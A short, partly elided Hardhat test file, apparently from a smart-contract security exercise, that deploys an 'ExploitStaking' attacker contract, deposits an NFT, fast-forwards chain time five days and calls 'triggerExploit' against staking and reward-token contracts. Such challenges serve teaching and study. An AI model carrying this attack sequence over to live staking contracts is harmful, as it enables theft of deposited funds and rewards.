...
describe(NAME, function () {
  async function setup() {
    ...
    const AttackerFactory = await ethers.getContractFactory("ExploitStaking");
  ...
  describe("exploit", async function () {
    ...
    it('conduct your attack here', async function () {
        const depositTx = await attackerContract
            ...
            .depositNFT(NFTToStakeContract.address, depositoorContract.address, rewardTokenContract.address);
        await depositTx.wait();
        await ethers.provider.send('evm_increaseTime', [5 * 24 * 60 * 60]);
        await ethers.provider.send('evm_mine');
        const attackTx = await attackerContract
            .connect(attackerWallet)
            .triggerExploit(NFTToStakeContract.address, depositoorContract.address, rewardTokenContract.address);
        await attackTx.wait();
    });
